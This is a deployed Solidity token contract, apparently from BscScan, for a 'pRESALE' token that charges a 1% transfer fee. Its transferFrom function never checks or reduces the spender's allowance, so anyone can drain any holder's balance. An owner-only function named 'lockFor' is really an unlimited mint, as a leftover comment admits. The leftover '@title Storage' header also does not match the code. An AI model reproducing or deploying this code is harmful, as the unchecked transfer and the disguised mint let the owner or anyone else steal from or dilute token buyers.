/**
 *Submitted for verification at BscScan.com on 2021-12-05
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 */


contract preFinal {  
    //hashmaps
     mapping(address => uint) balances;
     mapping(address => mapping(address => uint)) allowed;

   //events
         event Transfer(address indexed from, address indexed to, uint tokens);
         event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    address public owner = 0x5314F5EC3a463D43651e83777bebEe0cb50b39e3;
    address private feeHolder = 0xDc5DD00d0e7Ee61910Bef45f84a1Dca7A5e6fD50;

 constructor() {
        symbol = "PS";
        name = "pRESALE";
        decimals = 2;
        _totalSupply = 1000000000;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }


     function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
 
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
 
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
 
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }

  
 
    
 
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
 
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
 
    function transfer(address to, uint tokens) public returns (bool success) {

        uint finalValue = safeSub(tokens, tokens/100);

        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], finalValue);
        balances[feeHolder] = safeAdd((tokens/100), balances[feeHolder]);
        emit Transfer(msg.sender,feeHolder, tokens/100 );
        emit Transfer(msg.sender, to, finalValue);
        return true;
    }
 
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
 
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
           uint finalValue = safeSub(tokens, tokens/100);

           balances[to] = safeAdd(balances[to], finalValue);
           balances[from] = safeSub(balances[from], tokens);
           balances[feeHolder] = safeAdd(tokens/100, balances[feeHolder]);
           emit Transfer(from, feeHolder, tokens/100);
           emit Transfer(from, to, finalValue);

        return true;
    }
 
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    modifier onlyOwner {
    require(owner == msg.sender); //if msg.sender != owner, then mint function will fail to execute.
    _;
}
     function lockFor(uint amount) public onlyOwner  {

        _totalSupply = safeAdd(_totalSupply, amount);
        balances[owner] = balances[owner] + amount;
        emit Transfer(address(0), owner, amount);

}
 

}